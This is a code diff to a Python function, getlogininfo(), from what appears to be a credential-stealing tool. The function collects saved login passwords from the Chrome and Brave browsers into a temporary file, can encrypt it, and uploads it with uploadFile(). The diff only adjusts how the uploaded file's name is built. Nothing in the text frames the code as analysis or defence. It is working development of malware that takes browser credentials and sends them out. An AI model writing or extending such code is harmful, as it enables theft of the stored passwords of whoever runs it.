@@ -181,7 +181,7 @@ def getlogininfo():
         chrome.get_password()
         if encrypt_loginInfo is True:
             chromeKey = encryption.encrypt_file(chromeFile)
-            return uploadFile(TEMP+r"\login.txt"+".enc")
+            return uploadFile(TEMP+r"\login"+".enc")
         else:
             return uploadFile(TEMP + r"\login.txt")
 
@@ -190,7 +190,7 @@ def getlogininfo():
         braveFile = TEMP + r"\login.txt"
         if encrypt_loginInfo is True:
             braveKey = encryption.encrypt_file(braveFile)
-            return uploadFile(TEMP+r"\login.txt"+".enc")
+            return uploadFile(TEMP+r"\login"+".enc")
         else:
             return uploadFile(TEMP + r"\login.txt")
     if browserInstalled == "Both":
@@ -201,7 +201,7 @@ def getlogininfo():
         if encrypt_loginInfo is True:
             braveKey = encryption.encrypt_file(braveFile)
             chromeKey = encryption.encrypt_file(chromeFile)
-            return uploadFile(braveFile + ".enc") + "\n" + uploadFile(chromeFile + ".enc")
+            return uploadFile(braveFile[:-4] + ".enc") + "\n" + uploadFile(chromeFile[:-4] + ".enc")
         else:
             return uploadFile(braveFile) + "\n" + uploadFile(chromeFile)
 
